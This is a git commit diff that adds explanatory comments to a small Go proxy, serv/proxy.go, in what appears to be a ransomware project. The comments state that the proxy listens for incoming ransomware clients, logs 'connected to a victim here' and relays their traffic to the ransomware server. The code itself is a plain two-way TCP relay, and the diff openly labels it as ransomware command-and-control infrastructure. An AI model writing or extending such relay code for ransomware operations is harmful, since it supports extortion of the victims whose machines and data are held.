c3fa37832c26b67e0b015fdb07f581a2cb6297b9
4zv4l <simon.blacks.be@gmail.com>
2021-12-29 21:12:45 +0100

    comment for the proxy server

--- serv/proxy.go
+++ serv/proxy.go
@@ -8,6 +8,7 @@ import (
 	"time"
 )
 
+// check for error and exit if there is one
 func check_err(err error) {
 	if err != nil {
 		fmt.Println("err :",err)
@@ -15,12 +16,15 @@ func check_err(err error) {
 	}
 }
 
+// send write buffer from client to read buffer from server
+// and vise versa
 func copy(dest net.Conn, src net.Conn) {
 	io.Copy(dest, src)
 	fmt.Println("Copied !")
 	return
 }
 
+// connect to the ransomware server
 func connServ() net.Conn {
 	var (
 		server_ip string = "127.0.0.1"
@@ -39,14 +43,18 @@ func main() {
 		client_port string = "8080"
 		target net.Conn
 	)
+	// listen for incoming ransomware client
 	incoming, err := net.Listen("tcp", client_ip+":"+client_port)
 	check_err(err)
 	defer incoming.Close()
 	for {
+		// connect to the server
 		target = connServ()
+		// catch a ransomware client
 		client, err := incoming.Accept()
 		check_err(err)
 		fmt.Println("connected to a victim here")
+		// transfer data
 		go copy(target, client)
 		go copy(client, target)
 		time.Sleep(5*time.Second)
